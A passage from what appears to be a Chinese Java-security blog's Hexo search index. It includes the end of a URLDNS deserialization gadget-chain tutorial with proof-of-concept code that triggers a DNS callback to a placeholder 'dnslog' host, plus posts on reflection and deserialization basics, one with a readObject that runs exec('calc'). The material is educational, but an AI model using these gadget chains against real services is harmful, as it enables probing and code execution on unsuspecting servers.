class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://dnslog&quot;</span>);<br>        HashMap&lt;Object, Object&gt; hashap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;Object, Object&gt;();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clz</span> <span class="hljs-operator">=</span> URL.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">hashcode</span> <span class="hljs-operator">=</span> clz.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<span class="hljs-comment">//注意私有属性</span><br>        hashcode.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//在这里，我们让hashCode的值不为-1，防止序列化发起DNS</span><br>        hashcode.set(url, <span class="hljs-number">2</span>);<br>        hashap.put(url, <span class="hljs-number">333</span>);<br>        <span class="hljs-comment">//在这里再修改回-1，让反序列化发起DNS请求</span><br>        hashcode.set(url, -<span class="hljs-number">1</span>);<br>        Serialize(hashap);<br>        <span class="hljs-comment">//unSerialize(new File(&quot;ser.bin&quot;));</span><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unSerialize</span><span class="hljs-params">(File filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>&emsp;&emsp;再进行测试，就成功完成了URLDNS链的利用。</p><p><img src="/2023/10/20/2023-10-20-URLDNS%E9%93%BE/image-7.png" alt="序列化"></p><p><img src="/2023/10/20/2023-10-20-URLDNS%E9%93%BE/image-8.png" alt="反序列化"></p><h3 id="利用链流程"><a href="#利用链流程" class="headerlink" title="利用链流程"></a>利用链流程</h3><p>&emsp;&emsp;这是URLDNS链的大致利用流程，至于后续的getByName不再继续跟入。</p><p><img src="/2023/10/20/2023-10-20-URLDNS%E9%93%BE/image-9.png" alt="利用链"></p>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java反射一</title>
    <link href="/2023/10/18/2023-10-18-java%E5%8F%8D%E5%B0%84/"/>
    <url>/2023/10/18/2023-10-18-java%E5%8F%8D%E5%B0%84/</url>
    
    <content type="html"><![CDATA[<p>有人说希斯莱杰演出了最棒的小丑,也有人说杰昆菲尼克斯的小丑演的最入神,实际上我们都知道,是你,我的朋友,当你出场的时候我们都被你戏剧性的表演逗笑了,你才是当之无愧的小丑。</p><h1 id="Java反射"><a href="#Java反射" class="headerlink" title="Java反射"></a>Java反射</h1><h3 id="什么是Java反射"><a href="#什么是Java反射" class="headerlink" title="什么是Java反射"></a>什么是Java反射</h3><p>&emsp;&emsp;反射是java语言的一个特性，它允程序在运行时（注意不是编译的时候）来进行自我检查并<br>且对内部的成员进行操作。反射是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法<br>,对于任意一个对象，都能够调用它的任意方法和属性,这种动态获取信息以及动态调用对象方法的功能称为<br>java语言的反射机制。</p><p>&emsp;&emsp;那么通过这样的说法直接来获取一个概念非常抽象，但是我们假如存在这样一个场景，存在着这样一个Person类，存在两个属性，一个public属性和一个private属性，并且已经定义了参数，我们需要在代码运行的过程中去修改这两个属性的参数，就可以通过反射的方法直接进行调用。</p><p>&emsp;&emsp;这里同时也提到在不同类中调用私有属性的一些方式：</p><p>&emsp;&emsp;1.在含私有属性的类中创建公有方法进行操作。</p><p>&emsp;&emsp;2.通过反射进行操作。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;小明&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> <span class="hljs-number">28</span>;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>&emsp;&emsp;直接通过实例化对象的方式。直接创建对象打印结果，且这种方法无法直接对私有属性进行调用，而反射则可以解决这一问题。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        System.out.println(person.getName());<br>        System.out.println(person.getAge());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/10/18/2023-10-18-java%E5%8F%8D%E5%B0%84/image.png" alt="直接调用"></p><p>&emsp;&emsp;这里体现了反射的用处，我们可以在没有setter方法的情况下对一个类中的属性进行操作，当然，反射也可以对类中的其他方法进行操作、解决一些类无法进行序列化反序列化等问题，这个在之后碰到了会进行实际补充。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        System.out.println(person.getName());<br>        System.out.println(person.getAge());<br><br>        System.out.println(<span class="hljs-string">&quot;************反射***************&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> Person.class;<span class="hljs-comment">//反射创建一个类</span><br>        <span class="hljs-comment">//获取公有属性</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">namefield</span> <span class="hljs-operator">=</span> p.getField(<span class="hljs-string">&quot;name&quot;</span>);<br>        namefield.set(person, <span class="hljs-string">&quot;小红&quot;</span>);<br>        <span class="hljs-comment">//获取私有属性</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">agefiled</span> <span class="hljs-operator">=</span> p.getDeclaredField(<span class="hljs-string">&quot;age&quot;</span>);<br>        agefiled.setAccessible(<span class="hljs-literal">true</span>);<span class="hljs-comment">//激活私有属性</span><br>        agefiled.set(person, <span class="hljs-number">30</span>);<br><br>        System.out.println(person.getName());<br>        System.out.println(person.getAge());<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/2023/10/18/2023-10-18-java%E5%8F%8D%E5%B0%84/image2.png" alt="反射调用"></p><h3 id="反射中的一些常见操作"><a href="#反射中的一些常见操作" class="headerlink" title="反射中的一些常见操作"></a>反射中的一些常见操作</h3><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><span class="hljs-keyword">Class</span>&lt;?&gt; clazz = SomeClass.class<span class="hljs-punctuation">;</span><br><span class="hljs-comment">// 获取类名</span><br>String className = clazz.getName()<span class="hljs-punctuation">;</span><br><span class="hljs-comment">// 获取父类</span><br><span class="hljs-keyword">Class</span>&lt;?&gt; superClass = clazz.getSuperclass()<span class="hljs-punctuation">;</span><br><span class="hljs-comment">// 获取实现的接口</span><br><span class="hljs-keyword">Class</span>&lt;?&gt;[] interfaces = clazz.getInterfaces()<span class="hljs-punctuation">;</span><br><span class="hljs-comment">// 获取构造函数</span><br><span class="hljs-keyword">Constructor</span>&lt;?&gt;[] <span class="hljs-title function_">constructors</span> = <span class="hljs-title function_">clazz</span>.<span class="hljs-title function_">getConstructors</span><span class="hljs-params">()</span>;<br><span class="hljs-comment">// 获取方法</span><br><span class="hljs-keyword">Method</span>[] <span class="hljs-title function_">methods</span> = <span class="hljs-title function_">clazz</span>.<span class="hljs-title function_">getMethods</span><span class="hljs-params">()</span>;<br><span class="hljs-comment">// 获取字段</span><br>Field[] fields = clazz.getFields()<span class="hljs-punctuation">;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java反序列化基础（二）</title>
    <link href="/2023/10/18/2023-10-18-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/"/>
    <url>/2023/10/18/2023-10-18-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<p>不要总是羡慕别人的成功，如果大家都可以像哥哥一样坚持渗透测试两年半的话，那么大家都会成为优秀的红队了。</p><h1 id="Java反序列化漏洞"><a href="#Java反序列化漏洞" class="headerlink" title="Java反序列化漏洞"></a>Java反序列化漏洞</h1><h3 id="产生的原因"><a href="#产生的原因" class="headerlink" title="产生的原因"></a>产生的原因</h3><p>只要服务端反序列化数据，客户端传递类的readObject中代码会自动执行，给予攻击者在服务器上运行代码的能力。</p><h3 id="可能的形式"><a href="#可能的形式" class="headerlink" title="可能的形式"></a>可能的形式</h3><p>1.入口类的readObject直接调用危险方法。（在实际情况中这种很难存在，因为已知readObject一定会被执行的情况下再加入危险方法，这样的程序员一般会被拉去枪毙。）</p><p>2.入口类参数中包含可控类，该类有危险方法，readObject时调用。</p><p>3.入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject时调用。<br>比如类型定义为Object，调用equals&#x2F;hashcode&#x2F;toString</p><p>4.构造函数&#x2F;静态代码块等类加载时隐式执行。</p><h3 id="共同条件"><a href="#共同条件" class="headerlink" title="共同条件"></a>共同条件</h3><p>继承Serializable(保证可以被序列化与反序列化)</p><p>入口类&emsp;&emsp;[重写readObject(需要调用下一步的代码)&emsp;&emsp;参数类型宽泛(可以往里面任意传) &emsp;&emsp;最好jdk自带(可以通用)]&emsp;&emsp;例如：Map对象</p><p>调用链&emsp;&emsp;</p><p>执行类（rce SSRF 写文件）</p><h3 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h3><p>我们以入口类的readObject直接调用危险方法为例来实现一次反序列化攻击的流程。</p><p>先自定义一个可以被反序列化的类，并且重写readObject</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">public</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span>&#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        ois.defaultReadObject();<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>之后实例化并且将这个类序列化，保存在ser.bin文件中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializePerson</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;aa&quot;</span>, <span class="hljs-number">22</span>);<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(person);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>读取ser.bin，反序列化，执行readObject，弹出计算器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">unSerializePerson</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>成功执行<br><img src="/2023/10/18/2023-10-18-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/image.png" alt="执行成功"></p>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java反序列化基础（一）</title>
    <link href="/2023/10/17/2023-10-17-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/"/>
    <url>/2023/10/17/2023-10-17-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<p>女神的拒绝千篇一律,兄弟的小丑各有千秋</p><h1 id="Java序列化与反序列化"><a href="#Java序列化与反序列化" class="headerlink" title="Java序列化与反序列化"></a>Java序列化与反序列化</h1><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>Java序列化就是指把Java对象转换为字节序列的过程，反序列化就是指把字节序列恢复为Java对象的过程。</p><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>序列化最重要的作用：在传递和保存对象时.保证对象的完整性和可传递性。对象转换为有序字节流,以便在网络上传输或者保存在本地文件中。</p><p>反序列化的最重要的作用：根据字节流中保存的对象状态及描述信息，通过反序列化重建对象。</p><p>总结：核心作用就是对象状态的保存和重建。（整个过程核心点就是字节流中所保存的对象状态及描述信息）</p><h3 id="利用代码"><a href="#利用代码" class="headerlink" title="利用代码"></a>利用代码</h3><p>首先创建一个Person类，保证其继承Serializable使其可以被进行序列化反序列化操作。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br><br>    <span class="hljs-keyword">public</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span>&#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>序列化的过程。通过ObjectOutputStream创建ser.bin文件，并且通过writeObject将序列化的字节流写入ser.bin。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">serializeTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;<br><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;aa&quot;</span>,<span class="hljs-number">22</span>);<br>        serialize(person);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException&#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>反序列化的过程。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UnserializeTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        System.out.println(obj);<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> (Person) unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>        System.out.println(person);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ser.bin内容</p><p><img src="/2023/10/17/2023-10-17-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/image-20231017152940263-1697527793094-1.png" alt="bin文件"></p>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>测试文章</title>
    <link href="/2023/10/16/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/"/>
    <url>/2023/10/16/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/10/16/hello-world/"/>
    <url>/2023/10/16/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
